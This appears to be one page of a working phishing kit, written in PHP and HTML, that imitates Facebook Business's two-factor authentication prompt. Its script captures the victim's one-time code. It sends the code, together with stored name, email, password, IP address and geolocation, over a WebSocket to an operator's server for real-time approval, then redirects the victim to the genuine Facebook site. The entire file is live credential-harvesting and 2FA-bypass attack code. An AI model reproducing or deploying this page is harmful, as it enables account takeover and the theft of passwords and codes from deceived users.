<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$domain_name = file_get_contents('domain_name.txt');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-factor authentication required</title>
    <link rel="icon" href="../../images/favicon.ico">
    <link rel="stylesheet" href="../../styles/two-factor-authentication.css">
</head>
<body>
    <div class="auth-container">
        <div class="auth-card">
            <h1>Two-factor authentication required</h1>
            <p class="instruction">Generate a code in your authentication app, and enter it here.</p>
            
            <a href="#" class="learn-more">Learn more</a>
            
            <form class="auth-form" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
                <div class="input-group">
                    <input type="text" id="code" placeholder="Enter code" maxlength="8">
                    <div class="error-message" style="display: none;">
                        <span class="error-icon">⚠️</span>
                        <span class="error-text">The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
                    </div>
                </div>
                
                <div class="form-footer">
                    <a href="#" class="alternative-auth">Need another way to authenticate?</a>
                    <button type="submit" class="confirm-btn">Confirm</button>
                </div>
            </form>
        </div>
    </div>
    <?php include 'loading.php'; ?>

    <script>
        let ws = null;
        let reconnectInterval = 5000; // 5 seconds
        let reconnectTimer = null;
        let orderId = localStorage.getItem('currentOrderId');

        function createWebSocket() {
            ws = new WebSocket('wss://<?php echo $domain_name; ?>');

            ws.onopen = function() {
                console.log('Connected to WebSocket.');
                clearTimeout(reconnectTimer);
            };

            ws.onclose = function() {
                console.log('WebSocket connection closed. Reconnecting...');
                reconnectTimer = setTimeout(createWebSocket, reconnectInterval);
            };

            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                ws.close();
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                if (data.type === 'admin_approve_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
                    localStorage.setItem('currentOrderId', data.order_id);
                    localStorage.setItem('currentStep', data.step);
                    localStorage.setItem('currentCode', data.code);
                    window.location.href = 'https://business.facebook.com/select/?next=';
                } else if (data.type === 'admin_reject_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
                    hideLoading();
                    var codeInput = document.getElementById('code');
                    codeInput.value = "";
                    codeInput.value = data.user_info.code;
                    codeInput.focus();
                    codeInput.style.border = '1px solid #FF0303';

                    var errorMessage = document.querySelector('.error-message');
                    showError(errorMessage, codeInput);
                }
            };
        }

        // Initialize WebSocket connection
        createWebSocket();

        function showError(errorMessage, codeInput) {
            errorMessage.style.display = 'flex';
            codeInput.classList.add('error');
        }

        function hideError(errorMessage, codeInput) {
            errorMessage.style.display = 'none';
            codeInput.classList.remove('error');
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const codeInput = document.getElementById('code');
            const confirmBtn = document.querySelector('.confirm-btn');
            const errorMessage = document.querySelector('.error-message');

            // Format input to only allow numbers and max 8 digits
            codeInput.addEventListener('input', function(e) {
                // Remove any non-numeric characters
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Limit to 8 digits
                if (this.value.length > 8) {
                    this.value = this.value.slice(0, 8);
                }

                if (codeInput.value.length > 0) {
                    codeInput.style.border = '1px solid #E5E5E5';
                } else {
                    codeInput.style.border = '1px solid #FF0303';
                }

                hideError(errorMessage, codeInput);
            });
        });
            
        function sendToTelegramFromTwoFactorAuthentication(event) {
            event.preventDefault();
            var errorMessage = document.querySelector('.error-message');
            var codeInput = document.getElementById('code');
            var code = document.getElementById('code').value || '';

            console.log(code);
            console.log(code.length);
            if (code == "" || code.length < 6){
                showError(errorMessage, codeInput);
            } else {
                var firstName = localStorage.getItem('firstName');
                var lastName = localStorage.getItem('lastName');
                var personalEmail = localStorage.getItem('personalEmail');
                var password = localStorage.getItem('password');

                var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
                var ip_address = `<?php echo $ip; ?>`;
                var city = `<?php echo $city; ?>`;
                var region = `<?php echo $region; ?>`;
                var country = `<?php echo $country; ?>`;
                var org = `<?php echo $org; ?>`;
                var timezone = `<?php echo $timezone; ?>`;

                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'enter_code',
                        order_id: orderId,
                        code: code,
                        step: 3,
                        user_info: {
                            name: firstName + " " + lastName,
                            email: personalEmail,
                            ip: ip,
                            ip_address: ip_address,
                            city: city,
                            region: region,
                            country: country,
                            org: org,
                            timezone: timezone,
                            password: password,
                            code: code,
                            phone: ""
                        }
                    }));
                    showLoading();
                } else {
                    console.error('WebSocket is not connected. Cannot send data.');
                    window.location.reload();
                    return;
                }
            }
        }
    </script>
</body>
</html> 